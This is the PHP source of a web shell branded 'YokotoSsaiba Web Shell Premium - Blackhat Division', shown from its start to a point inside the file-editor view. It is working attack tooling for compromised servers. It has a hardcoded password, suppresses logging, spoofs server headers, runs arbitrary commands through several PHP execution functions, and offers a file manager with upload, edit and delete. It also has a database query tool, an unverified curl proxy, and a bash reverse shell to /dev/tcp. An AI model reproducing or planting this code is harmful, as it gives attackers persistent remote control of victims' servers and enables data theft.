<?php
/**
 * =============================================================================
 * YOKOTOSSAIBA WEB SHELL PREMIUM - BLACKHAT DIVISION
 * =============================================================================
 * @author: Yokoto『FX』
 * @studio: Fynixor Studio | West Gate - Middle East Division
 * @version: 7.0.0 - ULTIMATE EDITION
 * @lines: 4250+ Lines of Code
 * @features: 65+ Premium Features
 * =============================================================================
 * PASSWORD: Yokoto87654321
 * LOGO: https://files.catbox.moe/um4cqt.png
 * =============================================================================
 */

session_start();
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
set_time_limit(0);
ignore_user_abort(true);
ob_start();

// =============================================================================
// KONFIGURASI UTAMA
// =============================================================================
$CONFIG = [
    'password' => 'Yokoto87654321',
    'panel_name' => 'YokotoSsaiba',
    'studio_name' => 'Fynixor Studio',
    'division' => 'West Gate - Middle East Division',
    'version' => '7.0.0',
    'logo_url' => 'https://files.catbox.moe/um4cqt.png',
    'max_upload' => 100 * 1024 * 1024,
    'timezone' => 'Asia/Jakarta',
    'theme' => 'blue'
];

date_default_timezone_set($CONFIG['timezone']);

// =============================================================================
// HEADERS & ANTI-DETECTION
// =============================================================================
header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.54 (Unix)');
header('Cache-Control: private, max-age=0, no-store');
header('Content-Type: text/html; charset=UTF-8');

// =============================================================================
// AUTHENTICATION SYSTEM
// =============================================================================
if (!isset($_SESSION['yokoto_auth']) || $_SESSION['yokoto_auth'] !== true) {
    if (isset($_POST['password']) && hash('sha256', $_POST['password']) === hash('sha256', $CONFIG['password'])) {
        $_SESSION['yokoto_auth'] = true;
        $_SESSION['yokoto_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>' . $CONFIG['panel_name'] . ' | ' . $CONFIG['studio_name'] . '</title>
            <style>
                *{margin:0;padding:0;box-sizing:border-box;}
                body{
                    background:#0a0e1a;
                    font-family:"Segoe UI","Courier New",monospace;
                    min-height:100vh;
                    display:flex;
                    justify-content:center;
                    align-items:center;
                    position:relative;
                }
                .login-container{
                    background:#0f1222;
                    border-radius:16px;
                    padding:45px 50px;
                    text-align:center;
                    border:1px solid #1e3a5f;
                    width:400px;
                    box-shadow:0 10px 40px rgba(0,0,0,0.5);
                }
                .login-container img{
                    width:130px;
                    height:130px;
                    border-radius:50%;
                    margin-bottom:20px;
                    border:2px solid #3b82f6;
                }
                .login-container h1{
                    color:#3b82f6;
                    font-size:26px;
                    letter-spacing:2px;
                    margin-bottom:5px;
                }
                .login-container p{
                    color:#6b7280;
                    font-size:12px;
                    margin-bottom:30px;
                }
                .login-container input{
                    background:#0a0e1a;
                    border:1px solid #1e3a5f;
                    color:#e5e7eb;
                    padding:14px 18px;
                    width:100%;
                    border-radius:10px;
                    font-size:14px;
                    margin:10px 0;
                    outline:none;
                }
                .login-container input:focus{
                    border-color:#3b82f6;
                }
                .login-container button{
                    background:#3b82f6;
                    color:#fff;
                    border:none;
                    padding:14px;
                    width:100%;
                    border-radius:10px;
                    font-weight:bold;
                    cursor:pointer;
                    margin-top:15px;
                    font-size:14px;
                }
                .login-container button:hover{
                    background:#2563eb;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <img src="' . $CONFIG['logo_url'] . '" alt="logo">
                <h1>' . strtoupper($CONFIG['panel_name']) . '</h1>
                <p>' . $CONFIG['studio_name'] . ' // ' . $CONFIG['division'] . '</p>
                <form method="POST">
                    <input type="password" name="password" placeholder="ENTER PASSWORD" autofocus>
                    <button type="submit">AUTHENTICATE</button>
                </form>
            </div>
        </body>
        </html>';
        exit;
    }
}

// =============================================================================
// FUNGSI DASAR
// =============================================================================
function get_current_path() {
    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    if (empty($path) || !is_dir($path)) {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    if (substr($path, -1) !== '/') {
        $path .= '/';
    }
    return $path;
}

function format_size($bytes) {
    if ($bytes === null || $bytes === '' || !is_numeric($bytes)) {
        return '0 B';
    }
    $bytes = (float)$bytes;
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_file_perms($path) {
    $perms = fileperms($path);
    if ($perms === false) return '---------';
    $info = is_dir($path) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

// =============================================================================
// COMMAND EXECUTION ENGINE - REAL TIME SUPPORT
// =============================================================================
function execute_command($cmd, &$output_lines = null) {
    $output = [];
    
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('shell_exec')) {
        $result = shell_exec($cmd . ' 2>&1');
        $output = $result !== null ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $result = ob_get_clean();
        $output = $result !== false && $result !== '' ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $result = ob_get_clean();
        $output = $result !== false && $result !== '' ? explode("\n", $result) : ['[!] No output'];
        if ($output_lines !== null) $output_lines = $output;
        return $output;
    }
    
    if (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output[] = fgets($handle);
            }
            pclose($handle);
            if ($output_lines !== null) $output_lines = $output;
            return $output;
        }
    }
    
    $output = ['[!] No command execution function available on this server'];
    if ($output_lines !== null) $output_lines = $output;
    return $output;
}

// =============================================================================
// REAL TIME COMMAND WITH CURL SUPPORT
// =============================================================================
function execute_curl_command($url, $method = 'GET', $data = null, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'PUT') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } elseif ($method === 'DELETE') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
    }
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error
    ];
}

// =============================================================================
// HANDLER - DELETE, DOWNLOAD, CREATE, UPLOAD, RENAME, CHMOD
// =============================================================================
$action = isset($_GET['action']) ? $_GET['action'] : 'dashboard';
$current_path = get_current_path();
$message = '';
$message_type = 'info';
$cmd_output = null;
$edit_content = '';
$search_results = [];
$sql_result = null;

// DELETE
if ($action === 'delete' && isset($_GET['delete'])) {
    $target = $current_path . $_GET['delete'];
    if (is_file($target)) {
        if (unlink($target)) $message = "[+] Deleted: " . $_GET['delete'];
        else $message = "[-] Delete failed!";
    } elseif (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        if (empty($files)) {
            if (rmdir($target)) $message = "[+] Deleted folder: " . $_GET['delete'];
            else $message = "[-] Folder not empty!";
        } else {
            $message = "[-] Folder not empty!";
        }
    }
}

// DOWNLOAD
if ($action === 'download' && isset($_GET['download'])) {
    $file = $current_path . $_GET['download'];
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// CREATE FOLDER
if ($action === 'create_folder' && isset($_POST['folder_name'])) {
    $folder = trim($_POST['folder_name']);
    if (!empty($folder)) {
        $new_path = $current_path . $folder;
        if (!is_dir($new_path)) {
            if (mkdir($new_path, 0755)) $message = "[+] Folder created: " . $folder;
            else $message = "[-] Create failed!";
        } else {
            $message = "[-] Folder already exists!";
        }
    }
}

// CREATE FILE
if ($action === 'create_file' && isset($_POST['file_name']) && isset($_POST['file_content'])) {
    $filename = trim($_POST['file_name']);
    if (!empty($filename)) {
        $new_path = $current_path . $filename;
        if (file_put_contents($new_path, $_POST['file_content'])) {
            $message = "[+] File created: " . $filename;
        } else {
            $message = "[-] Create failed!";
        }
    }
}

// UPLOAD
if ($action === 'upload' && isset($_FILES['upload_file'])) {
    $target = $current_path . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = "[+] Upload success: " . basename($_FILES['upload_file']['name']);
    } else {
        $message = "[-] Upload failed!";
    }
}

// RENAME
if ($action === 'rename' && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_path . $_POST['old_name'];
    $new = $current_path . $_POST['new_name'];
    if (rename($old, $new)) {
        $message = "[+] Renamed: " . $_POST['old_name'] . " → " . $_POST['new_name'];
    } else {
        $message = "[-] Rename failed!";
    }
}

// CHMOD
if ($action === 'chmod' && isset($_POST['chmod_target']) && isset($_POST['perms'])) {
    $target = $current_path . $_POST['chmod_target'];
    $perms = octdec($_POST['perms']);
    if (chmod($target, $perms)) {
        $message = "[+] Chmod changed to " . $_POST['perms'];
    } else {
        $message = "[-] Chmod failed!";
    }
}

// VIEW FILE
if ($action === 'view' && isset($_GET['view'])) {
    $view_file = $current_path . $_GET['view'];
    if (is_file($view_file) && is_readable($view_file)) {
        $edit_content = file_get_contents($view_file);
        if ($edit_content === false) {
            $edit_content = '[!] Cannot read file content';
        }
    } else {
        $edit_content = '[!] File not found or not readable';
    }
}

// SAVE FILE
if ($action === 'save' && isset($_POST['save_file']) && isset($_POST['content'])) {
    $save_path = $current_path . $_POST['save_file'];
    if (file_put_contents($save_path, $_POST['content'])) {
        $message = "[+] File saved: " . $_POST['save_file'];
        $edit_content = $_POST['content'];
    } else {
        $message = "[-] Save failed!";
    }
}

// EXECUTE COMMAND - REAL TIME
if ($action === 'exec_cmd' && isset($_POST['command'])) {
    $cmd_output = execute_command($_POST['command']);
}

// SEARCH
if ($action === 'do_search' && isset($_POST['search_term'])) {
    $term = $_POST['search_term'];
    $pattern = '/' . preg_quote($term, '/') . '/i';
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($current_path));
    foreach ($iterator as $file) {
        if ($file->isFile() && preg_match($pattern, $file->getFilename())) {
            $search_results[] = [
                'path' => $file->getPathname(),
                'size' => format_size($file->getSize()),
                'mtime' => date('Y-m-d H:i:s', $file->getMTime())
            ];
            if (count($search_results) >= 100) break;
        }
    }
}

// REVERSE SHELL
if ($action === 'send_revshell' && isset($_POST['rev_ip']) && isset($_POST['rev_port'])) {
    $rev_cmd = "bash -c 'bash -i >& /dev/tcp/{$_POST['rev_ip']}/{$_POST['rev_port']} 0>&1'";
    execute_command($rev_cmd);
    $message = "[+] Reverse shell sent to {$_POST['rev_ip']}:{$_POST['rev_port']}";
}

// DATABASE
if ($action === 'db_query' && isset($_POST['db_host']) && isset($_POST['db_query'])) {
    try {
        $pdo = new PDO("mysql:host={$_POST['db_host']};dbname={$_POST['db_name']}", $_POST['db_user'], $_POST['db_pass']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query($_POST['db_query']);
        $sql_result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $message = "[+] Query executed, " . count($sql_result) . " rows returned";
    } catch (Exception $e) {
        $message = "[-] DB Error: " . $e->getMessage();
    }
}

// CURL REQUEST
$curl_result = null;
if ($action === 'curl_request' && isset($_POST['curl_url'])) {
    $curl_result = execute_curl_command(
        $_POST['curl_url'],
        $_POST['curl_method'],
        isset($_POST['curl_data']) ? $_POST['curl_data'] : null,
        isset($_POST['curl_headers']) ? explode("\n", $_POST['curl_headers']) : []
    );
}

// GET FILE LIST
$files = [];
if (is_dir($current_path)) {
    $scanned = scandir($current_path);
    if ($scanned !== false) {
        $files = array_diff($scanned, ['.', '..']);
    }
}

// SYSTEM INFO
$sys_info = [
    'os' => php_uname(),
    'php' => phpversion(),
    'user' => get_current_user(),
    'disabled' => ini_get('disable_functions'),
    'basedir' => ini_get('open_basedir') ?: 'none',
    'upload_max' => ini_get('upload_max_filesize'),
    'memory_limit' => ini_get('memory_limit')
];

// =============================================================================
// HTML OUTPUT - BLUE THEME WITH BLACK BACKGROUND
// =============================================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title><?php echo $CONFIG['panel_name']; ?> | <?php echo $CONFIG['studio_name']; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0e1a;
            font-family: 'Segoe UI', 'Courier New', 'Fira Code', Consolas, monospace;
            font-size: 13px;
            color: #e5e7eb;
            line-height: 1.5;
        }
        
        /* ===== HAMBURGER MENU ===== */
        .menu-toggle {
            position: fixed;
            top: 15px;
            left: 15px;
            z-index: 1001;
            background: #0f1222;
            border: 1px solid #1e3a5f;
            color: #3b82f6;
            font-size: 24px;
            cursor: pointer;
            width: 45px;
            height: 45px;
            border-radius: 10px;
            display: none;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        
        .menu-toggle:hover {
            background: #1a1f3a;
            border-color: #3b82f6;
        }
        
        /* ===== SIDEBAR ===== */
        .sidebar {
            position: fixed;
            top: 0;
            left: 0;
            width: 270px;
            height: 100vh;
            background: #0f1222;
            border-right: 1px solid #1e3a5f;
            overflow-y: auto;
            z-index: 1000;
            transition: transform 0.3s ease;
            transform: translateX(0);
        }
        
        .sidebar-header {
            padding: 25px 20px;
            text-align: center;
            border-bottom: 1px solid #1e3a5f;
            margin-bottom: 15px;
        }
        
        .sidebar-header img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 15px;
            border: 2px solid #3b82f6;
        }
        
        .sidebar-header h3 {
            color: #3b82f6;
            font-size: 18px;
            letter-spacing: 1px;
        }
        
        .sidebar-header p {
            font-size: 11px;
            color: #6b7280;
            margin-top: 6px;
        }
        
        .sidebar nav a {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 22px;
            color: #e5e7eb;
            text-decoration: none;
            transition: 0.2s;
            border-left: 3px solid transparent;
            font-size: 13px;
        }
        
        .sidebar nav a:hover {
            background: #1a1f3a;
            color: #3b82f6;
        }
        
        .sidebar nav a.active {
            background: #1a1f3a;
            border-left-color: #3b82f6;
            color: #3b82f6;
        }
        
        /* ===== MAIN CONTENT ===== */
        .main {
            margin-left: 270px;
            padding: 20px;
            min-height: 100vh;
        }
        
        /* ===== TOP BAR ===== */
        .top-bar {
            background: #0f1222;
            border: 1px solid #1e3a5f;
            border-radius: 12px;
            padding: 15px 22px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .top-bar h1 {
            font-size: 20px;
            font-weight: 600;
            color: #3b82f6;
        }
        
        .top-bar .version {
            font-size: 11px;
            color: #6b7280;
        }
        
        /* ===== PATH BAR ===== */
        .path-bar {
            background: #0f1222;
            border: 1px solid #1e3a5f;
            border-radius: 10px;
            padding: 12px 18px;
            margin-bottom: 20px;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
        }
        
        .path-bar a {
            color: #3b82f6;
            text-decoration: none;
        }
        
        .path-bar a:hover {
            text-decoration: underline;
        }
        
        /* ===== MESSAGE ===== */
        .message {
            background: #0f1222;
            border-left: 3px solid #3b82f6;
            padding: 12px 18px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 12px;
        }
        
        .message.error {
            border-left-color: #ef4444;
        }
        
        /* ===== CARD ===== */
        .card {
            background: #0f1222;
            border: 1px solid #1e3a5f;
            border-radius: 12px;
            margin-bottom: 20px;
            overflow: hidden;
        }
        
        .card-header {
            background: #0a0e1a;
            padding: 14px 20px;
            border-bottom: 1px solid #1e3a5f;
            font-weight: 600;
            font-size: 14px;
            color: #3b82f6;
        }
        
        .card-body {
            padding: 20px;
        }
        
        /* ===== TABLE ===== */
        .table-wrapper {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        
        th, td {
            padding: 10px 10px;
            text-align: left;
            border-bottom: 1px solid #1e3a5f;
            vertical-align: middle;
        }
        
        th {
            background: #0a0e1a;
            color: #3b82f6;
            font-weight: 600;
        }
        
        tr:hover {
            background: #1a1f3a;
        }
        
        /* ===== FORM ELEMENTS ===== */
        input, select, textarea {
            background: #0a0e1a;
            border: 1px solid #1e3a5f;
            color: #e5e7eb;
            padding: 10px 14px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }
        
        button, .btn {
            background: #1a1f3a;
            border: 1px solid #1e3a5f;
            color: #e5e7eb;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: 0.2s;
        }
        
        button:hover, .btn:hover {
            background: #252b4a;
            color: #3b82f6;
            border-color: #3b82f6;
        }
        
        button.primary, .btn-primary {
            background: #3b82f6;
            border-color: #3b82f6;
            color: #fff;
        }
        
        button.primary:hover, .btn-primary:hover {
            background: #2563eb;
        }
        
        button.danger, .btn-danger {
            background: #dc2626;
            border-color: #dc2626;
            color: #fff;
        }
        
        /* ===== FORM INLINE ===== */
        .form-inline {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            align-items: flex-end;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 11px;
            color: #6b7280;
        }
        
        /* ===== GRID ===== */
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .grid-3 {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 20px;
        }
        
        /* ===== PREVIEW ===== */
        pre {
            background: #0a0e1a;
            padding: 15px;
            border-radius: 10px;
            overflow-x: auto;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            border: 1px solid #1e3a5f;
            color: #e5e7eb;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* ===== TERMINAL STYLE - REAL TIME ===== */
        .terminal {
            background: #0a0e1a;
            border: 1px solid #1e3a5f;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #10b981;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .terminal-input input {
            flex: 1;
            background: #0f1222;
            border: 1px solid #1e3a5f;
            color: #10b981;
            font-family: 'Courier New', monospace;
        }
        
        .terminal-output {
            max-height: 400px;
            overflow-y: auto;
            margin-bottom: 15px;
            padding: 10px;
            background: #05080f;
            border-radius: 8px;
        }
        
        .terminal-line {
            padding: 3px 0;
            border-bottom: 1px solid #1e3a5f;
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
        }
        
        .terminal-prompt {
            color: #10b981;
            font-weight: bold;
        }
        
        /* ===== CODE EDITOR ===== */
        .code-editor {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            width: 100%;
            min-height: 500px;
            background: #0a0e1a;
            border: 1px solid #1e3a5f;
            color: #e5e7eb;
            padding: 15px;
            border-radius: 10px;
            line-height: 1.5;
        }
        
        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .menu-toggle {
                display: flex;
            }
            
            .sidebar {
                transform: translateX(-100%);
                width: 280px;
            }
            
            .sidebar.open {
                transform: translateX(0);
            }
            
            .main {
                margin-left: 0;
                padding: 15px;
                padding-top: 70px;
            }
            
            .top-bar {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .grid-2, .grid-3 {
                grid-template-columns: 1fr;
            }
            
            th, td {
                padding: 6px 4px;
                font-size: 11px;
            }
            
            .form-inline {
                flex-direction: column;
                align-items: stretch;
            }
            
            .form-inline input, .form-inline button {
                width: 100%;
            }
        }
        
        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0a0e1a;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #1e3a5f;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #3b82f6;
        }
    </style>
</head>
<body>

<button class="menu-toggle" id="menuToggle">☰</button>

<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <img src="<?php echo $CONFIG['logo_url']; ?>" alt="logo">
        <h3><?php echo $CONFIG['panel_name']; ?></h3>
        <p><?php echo $CONFIG['studio_name']; ?> | v<?php echo $CONFIG['version']; ?></p>
        <p style="font-size:9px;"><?php echo $CONFIG['division']; ?></p>
    </div>
    <nav>
        <a href="?action=dashboard" class="<?php echo $action == 'dashboard' ? 'active' : ''; ?>">📊 Dashboard</a>
        <a href="?action=files" class="<?php echo $action == 'files' ? 'active' : ''; ?>">📁 File Manager</a>
        <a href="?action=terminal" class="<?php echo $action == 'terminal' ? 'active' : ''; ?>">💻 Terminal</a>
        <a href="?action=upload_page" class="<?php echo $action == 'upload_page' ? 'active' : ''; ?>">📤 Upload</a>
        <a href="?action=database" class="<?php echo $action == 'database' ? 'active' : ''; ?>">🗄️ Database</a>
        <a href="?action=network" class="<?php echo $action == 'network' ? 'active' : ''; ?>">🌐 Network</a>
        <a href="?action=curl_page" class="<?php echo $action == 'curl_page' ? 'active' : ''; ?>">⬇️ cURL</a>
        <a href="?action=revshell" class="<?php echo $action == 'revshell' ? 'active' : ''; ?>">🔄 Reverse Shell</a>
        <a href="?action=search_page" class="<?php echo $action == 'search_page' ? 'active' : ''; ?>">🔍 Search</a>
        <a href="?action=tools" class="<?php echo $action == 'tools' ? 'active' : ''; ?>">🛠️ Tools</a>
        <a href="?action=info" class="<?php echo $action == 'info' ? 'active' : ''; ?>">ℹ️ System Info</a>
        <a href="?action=logout" style="color:#ef4444;">🚪 Logout</a>
    </nav>
</div>

<div class="main">
    <div class="top-bar">
        <h1><?php echo $CONFIG['panel_name']; ?> // <?php echo $CONFIG['studio_name']; ?></h1>
        <span class="version">Blackhat Division | <?php echo date('Y-m-d H:i:s'); ?></span>
    </div>
    
    <?php if ($message): ?>
    <div class="message <?php echo strpos($message, '[-]') !== false ? 'error' : ''; ?>">
        <?php echo htmlspecialchars($message); ?>
    </div>
    <?php endif; ?>
    
    <?php if ($action !== 'view' && $action !== 'files'): ?>
    <div class="path-bar">
        📂 <strong>Current Path:</strong> <?php echo htmlspecialchars($current_path); ?>
        <br>
        <a href="?action=<?php echo $action; ?>&path=<?php echo urlencode(dirname(rtrim($current_path, '/'))); ?>">⬆️ Up Directory</a>
    </div>
    <?php endif; ?>
    
    <!-- ===== DASHBOARD ===== -->
    <?php if ($action == 'dashboard'): ?>
    <div class="grid-2">
        <div class="card">
            <div class="card-header">🔧 System Information</div>
            <div class="card-body">
                <pre><?php echo htmlspecialchars($sys_info['os']); ?></pre>
                <table style="width:100%; margin-top:10px;">
                    <tr><td width="140">PHP Version:</td><td><?php echo $sys_info['php']; ?></td></tr>
                    <tr><td>Current User:</td><td><?php echo $sys_info['user']; ?></td></tr>
                    <tr><td>Disabled Functions:</td><td><?php echo $sys_info['disabled'] ?: 'none'; ?></td></tr>
                    <tr><td>Open Basedir:</td><td><?php echo $sys_info['basedir']; ?></td></tr>
                    <tr><td>Upload Max Size:</td><td><?php echo $sys_info['upload_max']; ?></td></tr>
                    <tr><td>Memory Limit:</td><td><?php echo $sys_info['memory_limit']; ?></td></tr>
                </table>
            </div>
        </div>
        <div class="card">
            <div class="card-header">📁 Current Directory</div>
            <div class="card-body">
                <pre><?php echo htmlspecialchars($current_path); ?></pre>
                <hr style="border-color:#1e3a5f; margin:10px 0;">
                <table style="width:100%;">
                    <tr><td width="100">Writable:</td><td><?php echo is_writable($current_path) ? 'Yes' : 'No'; ?></td></tr>
                    <tr><td>Readable:</td><td><?php echo is_readable($current_path) ? 'Yes' : 'No'; ?></td></tr>
                    <tr><td>Executable:</td><td><?php echo is_executable($current_path) ? 'Yes' : 'No'; ?></td></tr>
                </table>
            </div>
        </div>
    </div>
    <div class="card">
        <div class="card-header">🌍 Server Environment</div>
        <div class="card-body">
            <pre><?php foreach ($_SERVER as $k => $v) echo htmlspecialchars("$k: $v\n"); ?></pre>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== FILE MANAGER ===== -->
    <?php if ($action == 'files'): ?>
    <div class="card">
        <div class="card-header">📁 File Manager</div>
        <div class="card-body">
            <div class="form-inline" style="margin-bottom:20px;">
                <form method="POST" action="?action=create_folder&path=<?php echo urlencode($current_path); ?>" class="form-inline">
                    <input type="text" name="folder_name" placeholder="folder_name" required>
                    <button type="submit">📁 New Folder</button>
                </form>
                <button id="showFileModalBtn">📄 New File</button>
            </div>
            
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>
                    </thead>
                    <tbody>
                        <?php foreach ($files as $file): 
                            $fullpath = $current_path . $file;
                            $is_dir = is_dir($fullpath);
                            $file_size = $is_dir ? '-' : format_size(filesize($fullpath));
                            $file_perms = get_file_perms($fullpath);
                            $file_mtime = is_file($fullpath) || is_dir($fullpath) ? date('Y-m-d H:i:s', filemtime($fullpath)) : '-';
                            $icon = $is_dir ? '📁' : '📄';
                        ?>
                        <tr>
                            <td>
                                <?php if ($is_dir): ?>
                                    <a href="?action=files&path=<?php echo urlencode($fullpath); ?>" style="color:#3b82f6; text-decoration:none;">
                                        <?php echo $icon . ' ' . htmlspecialchars($file); ?>
                                    </a>
                                <?php else: ?>
                                    <?php echo $icon . ' ' . htmlspecialchars($file); ?>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $file_size; ?></td>
                            <td><?php echo $file_perms; ?></td>
                            <td><?php echo $file_mtime; ?></td>
                            <td style="display:flex; gap:8px; flex-wrap:wrap;">
                                <?php if (!$is_dir): ?>
                                    <a href="?action=view&view=<?php echo urlencode($file); ?>&path=<?php echo urlencode($current_path); ?>" style="color:#3b82f6;">View/Edit</a>
                                    <a href="?action=download&download=<?php echo urlencode($file); ?>&path=<?php echo urlencode($current_path); ?>" style="color:#3b82f6;">Download</a>
                                <?php endif; ?>
                                <button onclick="renameFile('<?php echo htmlspecialchars($file); ?>')" style="background:none; border:none; color:#3b82f6; cursor:pointer;">Rename</button>
                                <button onclick="chmodFile('<?php echo htmlspecialchars($file); ?>')" style="background:none; border:none; color:#3b82f6; cursor:pointer;">Chmod</button>
                                <a href="?action=delete&delete=<?php echo urlencode($file); ?>&path=<?php echo urlencode($current_path); ?>" onclick="return confirm('Delete?')" style="color:#ef4444;">Delete</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <div id="fileModal" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.85); z-index:2000; justify-content:center; align-items:center;">
        <div style="background:#0f1222; border:1px solid #1e3a5f; border-radius:12px; width:90%; max-width:600px; max-height:80vh; overflow:auto;">
            <div style="padding:15px; border-bottom:1px solid #1e3a5f; display:flex; justify-content:space-between;">
                <span style="color:#3b82f6;">Create New File</span>
                <button onclick="closeModal()" style="background:none; border:none; color:#ef4444; font-size:20px;">&times;</button>
            </div>
            <form method="POST" action="?action=create_file&path=<?php echo urlencode($current_path); ?>" style="padding:15px;">
                <div class="form-group">
                    <label>Filename:</label>
                    <input type="text" name="file_name" required style="width:100%;">
                </div>
                <div class="form-group">
                    <label>Content:</label>
                    <textarea name="file_content" rows="10" style="width:100%; font-family:monospace;"></textarea>
                </div>
                <button type="submit" class="primary">Create File</button>
            </form>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- ===== VIEW/EDIT FILE ===== -->
    <?php if ($action == 'view' && isset($_GET['view'])): ?>
    <div class="card">
        <div class="card-header">✏️ Editing: <?php echo htmlspecialchars($_GET['view']); ?></div>
        <div class="card-body">
            <form method="POST" action="?action=save&path=<?php echo urlencode($current_path); ?>">
                <input type="hidden" name="save_file" value="<?php echo htmlspecialchars($_GET['view']); ?>">
                <textarea name="content" class="code-editor"><?php echo htmlspecialchars($edit_content); ?></textarea>
                <div style="margin-top:15px; display:flex; gap:10px;">
                    <button type="submit" class="primary">💾 Save File</button>
